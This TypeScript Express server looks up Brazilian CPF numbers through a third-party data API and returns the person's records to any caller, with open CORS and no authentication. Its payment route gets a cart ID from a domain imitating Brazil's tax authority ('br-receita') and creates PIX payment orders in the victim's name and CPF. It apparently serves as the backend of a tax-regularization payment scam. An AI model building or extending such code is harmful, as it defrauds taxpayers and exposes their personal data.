// src/index.ts
import express, {
    Router,
    Request,
    Response,
    NextFunction,
    RequestHandler
  } from 'express';
  import dotenv from 'dotenv';
dotenv.config();  
  const app = express();
  const port = process.env.PORT || 3000;
  import cors from 'cors';
import rateLimit from 'express-rate-limit';
  app.use(express.json());
  app.use(cors(
    {
        origin: '*'
    }
));


  const consultaRouter: Router = Router();

  const cpfLimiter = rateLimit({
    windowMs: 60 * 1000, // 15 minutos
    max: 10,                  // max 60 requests por IP
    standardHeaders: true,    // retorna infos em RateLimit-* headers
    legacyHeaders: false,     // desativa X-RateLimit-* headers
  });
  const cpfConsulta = async (req: any, res: any, next: any) => {
    const { cpf } = req.params;
    
    try {
      const apiUrl = `https://datagetapi.online/api/v1/cpf/${cpf}`;
      const upstream = await fetch(apiUrl, { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${process.env.CPF_TOKEN}`
        }
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      const data = await upstream.json();
      return res.json(data);
    } catch (err) {
      next(err);
    }

  };

  consultaRouter.get('/:cpf',cpfLimiter, cpfConsulta);

  app.use('/', consultaRouter);



  const paymentRouter: Router = Router();
  const payment = async (req: any, res: any, next: any) => {
    const { cpf } = req.params;
    
    try {
      const apiUrl = `https://datagetapi.online/api/v1/cpf/${cpf}`;
      const upstream = await fetch(apiUrl, { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${process.env.CPF_TOKEN}`
        }
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      const data = await upstream.json();
      const paymentRes = await fetch(
        'https://regularizar.br-receita.org/r/QU0tNjgwZjdmOTg3M2QwMg',
        {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
          
          }
        }
      );
      
      if (!paymentRes.ok) {
        return res
          .status(paymentRes.status)
          .json({ error: `Payment API retornou ${paymentRes.status}` });
      }
      
      const cartId = (await paymentRes.text()).trim();  

   
      const orderPayload = {
        payment_method: 'pix',
        customer: {
          name:    data.NAME     || 'Nome Exemplo',
          email:    'customer@sememail.com',
          document: cpf,
          document_type: 'CPF'
        }
      };

      const getOrder = await fetch(
        `https://api-tenant.ads-information.top/cart/${cartId}`,
        {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            Accept: 'application/json',
          },
        
        }
      );
 
      if(!getOrder.ok) {
        return res.status(getOrder.status).json({ error: `Order APIsd retornou ${getOrder.status}` });
      }
      const getOrderData = await getOrder.json();
      
      if(getOrderData.completedOrders[0] && getOrderData.completedOrders[0].paid) {
        return res.json(getOrderData);
      }
      const orderRes = await fetch(
        `https://api-tenant.ads-information.top/cart/${cartId}/order?`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Accept: 'application/json',
          },
          body: JSON.stringify(orderPayload),
        }
      );
      if (!orderRes.ok) {
        console.log(await orderRes.json())
        return res.status(orderRes.status).json({ error: `Order API retornou ${orderRes.status}` });
      }
      const orderData = await orderRes.json();
      return res.json(orderData);
    } catch (err) {
      next(err);
    }
  }

  paymentRouter.get('/:cpf', payment);
  app.use("/payment", paymentRouter)
  
  app.listen(port, () => {
    console.log(`🚀 Server rodando em http://localhost:${port}`);
  });
  